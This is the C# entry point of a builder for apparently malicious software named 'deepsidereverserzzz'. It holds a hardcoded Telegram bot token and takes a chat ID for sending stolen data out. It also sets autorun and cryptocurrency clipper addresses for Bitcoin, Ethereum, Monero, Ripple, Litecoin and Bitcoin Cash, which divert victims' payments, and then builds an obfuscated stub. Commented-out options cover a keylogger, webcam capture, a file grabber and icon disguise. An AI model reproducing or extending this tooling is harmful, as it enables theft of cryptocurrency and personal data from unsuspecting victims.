

using System;

namespace deepsidebuilder
{
    class Program
    {
        [STAThreadAttribute]
        static void Main(string[] args)
        {
            Console.Title = "deepsidereverserzzz builder";
            cli.ShowInfo("deepsidereverserzzz");
            // Settings
            string token = "5488771621:AAHVNLXbaXdhFNRzvZCTpxaQxkhjpENjix4";//cli.GetStringValue("Telegram API token");
            string chatid = args[0];//cli.GetStringValue("Telegram chat ID");
            System.Console.WriteLine(chatid);
            build.ConfigValues["Telegram ID"] = chatid;//crypt.EncryptConfig(chatid);//
            build.ConfigValues["Startup"] = args[1];//cli.GetBoolValue("Install autorun?");
            build.ConfigValues["ClipperBTC"] = args[2];//cli.GetEncryptedString("Clipper : Your bitcoin address");
            build.ConfigValues["ClipperETH"] = args[3];//cli.GetEncryptedString("Clipper : Your etherium address");
            build.ConfigValues["ClipperXMR"] = args[4];//cli.GetEncryptedString("Clipper : Your monero address");
            build.ConfigValues["ClipperXRP"] = args[5];//cli.GetEncryptedString("Clipper : Your ripple address");
            build.ConfigValues["ClipperLTC"] = args[6];//cli.GetEncryptedString("Clipper : Your litecoin address");
            build.ConfigValues["ClipperBCH"] = args[7];//cli.GetEncryptedString("Clipper : Your bitcoin cash address");

            // File grabber
            //build.ConfigValues["Grabber"] = cli.GetBoolValue("Enable file grabber?");

            // Modules
            //if (build.ConfigValues["Startup"].Equals("1")) {
            //    build.ConfigValues["WebcamScreenshot"] = cli.GetBoolValue("Create webcam screenshots?");
            //    build.ConfigValues["Keylogger"] = cli.GetBoolValue("Install keylogger?");
            //    build.ConfigValues["Clipper"] = cli.GetBoolValue("Install clipper?");
            //}

            // Clipper addresses


            // Build
            string builded = build.BuildStub(chatid);
            //string confuzed = obfuscation.Obfuscate(builded);
            //// Select icon
            //if (System.IO.Directory.Exists("icons"))
            //    if (cli.GetBoolValue("Do you want change file icon?") == "1")
            //    {
            //        string icon = cli.GetIconPath();
            //        if (icon != null)
            //            IconChanger.InjectIcon(confuzed, icon);
            //    }
            // Done
            cli.ShowSuccess("Obfuscated stub: " + builded + " saved.");
            
        }
    }
}
